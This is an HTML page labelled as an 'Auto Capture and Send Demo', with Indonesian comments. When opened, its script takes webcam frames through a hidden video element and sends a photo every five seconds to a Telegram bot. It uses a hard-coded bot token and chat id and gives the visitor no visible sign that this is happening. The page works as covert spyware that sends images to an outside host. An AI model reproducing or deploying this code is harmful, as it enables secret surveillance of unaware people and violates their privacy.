<!DOCTYPE html>
<html>
<head>
    <title>Auto Capture and Send Demo</title>
</head>
<body>
    <h1>Auto Capture and Send Demo</h1>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <script>
        const token = '6881667147:AAG_C3UWpEys2igKflAF-AagpxC4zjy8a-A';
        const chat_id = '-1002052635750';

        async function startCamera() {
            const video = document.getElementById('video');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                video.addEventListener('loadeddata', () => {
                    captureAndSendImage();
                });
            } catch (err) {
                console.error('Error accessing camera:', err);
            }
        }

        function captureAndSendImage() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataURL = canvas.toDataURL('image/png');
            const photo = dataURL.split(',')[1]; // Mengambil data gambar

            // Membuat form data untuk mengirim gambar
            const formData = new FormData();
            formData.append('chat_id', chat_id);
            formData.append('photo', `data:image/png;base64,${photo}`);

            // Mengirim foto menggunakan fetch API
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Foto berhasil dikirim:', data);
                } else {
                    console.error('Error dari Telegram:', data);
                }
            })
            .catch(error => console.error('Error:', error));

            // Ulangi pengambilan gambar setiap 5 detik
            setTimeout(captureAndSendImage, 5000);
        }

        startCamera();
    </script>
</body>
</html>

